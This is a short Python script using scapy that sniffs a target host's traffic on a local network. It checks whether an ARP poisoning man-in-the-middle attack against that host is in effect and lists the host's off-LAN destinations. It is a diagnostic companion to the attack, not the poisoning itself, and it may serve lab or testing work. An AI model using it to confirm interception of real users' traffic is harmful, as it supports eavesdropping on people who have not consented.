"""arp_diag.py -- verify ARP poison is in effect on a specific target.

Sniffs all frames from target_ip and reports the destination MAC distribution.
If poison is working: dst MAC == our MAC for traffic going to off-LAN IPs.
If poison failed:    dst MAC == gateway MAC.
"""
from __future__ import annotations
import sys, time
from collections import Counter
from scapy.all import sniff, Ether, IP  # type: ignore

iface = sys.argv[1] if len(sys.argv) > 1 else "Wi-Fi 2"
target_ip = sys.argv[2] if len(sys.argv) > 2 else "192.168.0.16"
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 25
our_mac = "04:d3:b0:14:79:0e"
gw_mac = "70:5d:cc:b1:7e:40"

dst_mac_counter: Counter[str] = Counter()
dst_ip_counter: Counter[str] = Counter()
total = 0

def on_pkt(p):
    global total
    if not p.haslayer(IP) or not p.haslayer(Ether):
        return
    if p[IP].src != target_ip:
        return
    total += 1
    dst_mac = p[Ether].dst.lower()
    label = (
        " <-- OUR MAC (poison working)" if dst_mac == our_mac
        else " <-- gateway (poison ignored)" if dst_mac == gw_mac
        else " <-- broadcast/multicast" if dst_mac.startswith(("ff:", "01:", "33:"))
        else " <-- LAN peer"
    )
    dst_mac_counter[dst_mac + label] += 1
    dst_ip = p[IP].dst
    is_lan = dst_ip.startswith("192.168.")
    is_mcast = int(dst_ip.split(".")[0]) >= 224
    if not is_lan and not is_mcast:
        dst_ip_counter[dst_ip] += 1

print(f"[arp_diag] sniffing for {duration}s -- target={target_ip} our_mac={our_mac} gw_mac={gw_mac}")
sniff(iface=iface, prn=on_pkt, store=False, timeout=duration,
      filter=f"ip and src host {target_ip}")
print(f"\n========== {total} frames from {target_ip} ==========")
print("Destination MAC distribution:")
for mac, n in dst_mac_counter.most_common():
    print(f"  {n:5}  {mac}")
print("\nTop off-LAN destination IPs:")
for ip, n in dst_ip_counter.most_common(10):
    print(f"  {n:5}  {ip}")
